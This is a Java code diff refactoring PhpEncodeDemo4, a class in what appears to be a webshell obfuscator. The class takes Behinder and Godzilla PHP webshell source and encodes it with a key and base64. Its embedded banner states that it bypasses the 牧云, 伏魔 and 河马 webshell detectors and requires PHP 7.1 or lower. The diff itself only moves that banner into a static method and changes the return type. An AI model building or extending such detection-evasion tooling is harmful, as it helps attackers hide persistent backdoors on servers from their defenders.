@@ -11,7 +11,6 @@ public class PhpEncodeDemo4 {
     String key;
     String sourcecode;
     String encode;
-    String demo4txt;
 
     public PhpEncodeDemo4() {
     }
@@ -21,7 +20,18 @@ public class PhpEncodeDemo4 {
         this.key = key;
         this.sourcecode = code;
     }
-    public String[] Run(){
+
+    public static String GetDemotxt(){
+
+        return "/*\n" +
+                " * By: XG小刚\n" +
+                " * Time: 2023-09-13_demo4\n" +
+                " * Bypass: 牧云、伏魔、河马在线、河马本地(1.8.2)\n" +
+                " * 需php版本 <= 7.1\n" +
+                " */";
+    }
+
+    public String Run(){
 
         if(!sourcecode.isEmpty()){
             try {
@@ -46,18 +56,12 @@ public class PhpEncodeDemo4 {
                 encode = encode.replace("$key$",this.key);
                 encode = encode.replace("$base64code$",s);
 
-                demo4txt = "/*\n" +
-                        " * By: XG小刚\n" +
-                        " * Time: 2023-09-13_demo4\n" +
-                        " * Bypass: 牧云、伏魔、河马在线、河马本地(1.8.2)\n" +
-                        " * 需php版本 <= 7.1\n" +
-                        " */";
-                return new String[]{this.encode,this.demo4txt};
+                return this.encode;
             }catch (Exception e){
-                return new String[]{"加密失败",this.demo4txt};
+                return "加密失败";
             }
         }else {
-            return new String[]{"请输入冰蝎、哥斯拉php源码",this.demo4txt};
+            return "请输入冰蝎、哥斯拉PHP源码";
         }
 
     }
